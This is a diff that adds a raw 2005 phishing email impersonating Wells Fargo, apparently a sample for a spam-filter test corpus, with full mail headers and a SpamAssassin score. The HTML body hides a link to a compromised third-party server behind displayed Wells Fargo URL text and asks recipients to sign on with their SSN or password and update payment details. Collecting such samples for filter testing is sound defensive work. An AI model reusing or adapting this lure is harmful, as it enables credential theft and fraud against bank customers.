@@ -1,0 +1,96 @@
+Return-Path: <nobody@mudcreek.choose-iwd.com>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail2.example.com (mail2.example.com [10.3.4.5])
+	by naughty.example.com (Postfix) with ESMTP id 27293537288
+	for <nobody@login.example.com>; Fri, 23 Dec 2005 21:04:36 -0500 (EST)
+Received: from mail2.example.com (localhost.example.com [127.0.0.1])
+	by mail2.example.com (Postfix) with ESMTP id 2AFFB6FA3F3
+	for <nobody@example.com>; Fri, 23 Dec 2005 21:00:23 -0500 (EST)
+Received: from lujan.example.com (foo.example.com [10.2.3.4])
+	by mail2.example.com (Postfix) with ESMTP
+	for <nobody@example.com>; Fri, 23 Dec 2005 21:00:23 -0500 (EST)
+Received: by lujan.example.com (Postfix)
+	id C46E91BC48; Sat, 24 Dec 2005 03:00:21 +0100 (CET)
+Delivered-To: foobee@example.com
+Received: from localhost (unknown [127.0.0.1])
+	by lujan.example.com (Postfix) with ESMTP id 718B61BC1A
+	for <foobee@example.com>; Sat, 24 Dec 2005 02:00:21 +0000 (UTC)
+Received: from lujan.example.com ([10.2.3.4])
+	by localhost (lujan [10.2.3.4]) (amavisd-new, port 10024)
+	with ESMTP id 06424-01 for <foobee@example.com>;
+	Sat, 24 Dec 2005 03:00:05 +0100 (CET)
+Received: from mudcreek.choose-iwd.com (unknown [70.85.168.114])
+	by lujan.example.com (Postfix) with ESMTP id 2A80D1BB12
+	for <foobee@example.com>; Sat, 24 Dec 2005 03:00:02 +0100 (CET)
+Received: from nobody by mudcreek.choose-iwd.com with local (Exim 4.50)
+	id 1Epz5W-0006Im-0w
+	for foobee@example.com; Fri, 23 Dec 2005 20:24:50 -0600
+To: foobee@example.com
+Subject: Wells Fargo Bank Online
+From: Wells Fargo Bank <ofsrep.fmcmigw@wellsfargo.com>
+Reply-To: 
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1Epz5W-0006Im-0w@mudcreek.choose-iwd.com>
+Date: Fri, 23 Dec 2005 20:24:50 -0600
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - mudcreek.choose-iwd.com
+X-AntiAbuse: Original Domain - example.com
+X-AntiAbuse: Originator/Caller UID/GID - [99 99] / [47 12]
+X-AntiAbuse: Sender Address Domain - mudcreek.choose-iwd.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Virus-Scanned: by amavisd-new-20030616-p10 (Debian) at example.com
+X-Spam-Checker-Version: SpamAssassin 3.0.2 (2004-11-16)
+X-Spam-Level: ***
+X-Spam-Status: No, score=3.4 required=5.0 tests=HTML_30_40,HTML_MESSAGE,
+	MIME_HTML_ONLY,RAZOR2_CHECK,REPLY_TO_EMPTY autolearn=no version=3.0.2
+X-Spam-Report: 
+	*  1.6 REPLY_TO_EMPTY Reply-To: is empty
+	*  0.0 HTML_30_40 BODY: Message is 30% to 40% HTML
+	*  0.0 HTML_MESSAGE BODY: HTML included in message
+	*  0.2 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+	*  1.5 RAZOR2_CHECK Listed in Razor2 (http://razor.sf.net/)
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 168
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title>Untitled Document</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body>
+Dear Wells Fargo Customer :
+<p>Update your Information for more security from wells fargo . If you recieve
+  any email or pop-up requesting your Wells Fargo account information rebort
+  it . this is the last email we will send for our customer . if you recieve
+  any email another report it at once</p>
+<p><a href="http://lwserver.ksn.at/phpkmz/simple%20blog/images/online.wellsfargo.com/auxiliary_access/1999/bb61162e7a787f/cgi-bin/a248.e.akamai.net/Mprc6XvBkuZqDGNbqlxb&PROCESSING_TRANSACTIO/update-wells-fargo/">https://online.wellsfargo.com/update?LOB=CONS</a></p>
+<p>It's Easy to Get Started:</p>
+<p>1- sign on with your ssn or username and password .</p>
+<p>2- Update your payment information as it is in our files .</p>
+<p>Have additional questions? Send us an email by clicking on "Contact Us" while
+  you are signed on to Online Banking, or call 1-800-956-4442. We're available
+  24 hours a day, 7 days a week.</p>
+<p>Sincerely,</p>
+<p>R. Thomas<br>
+  Senior Vice President</p>
+<p>A Note About Online Security<br>
+  Be advised, Wells Fargo will never require you to send personal or financial
+    information through email or pop-up windows. If you receive an email or pop-up
+    requesting your Wells Fargo account information, consider it fraudulent and
+    report it immediately to Wells Fargo Online Fraud Prevention at: <a href="http://wellsfargo.com/privacy_security/email_fraud/reportform">wellsfargo.com/privacy_security/email_fraud/reportform.</a></p>
+<p><br>
+  CON_E_WELCOME_BP<br>
+</p>
+
+</body>
+</html>
+
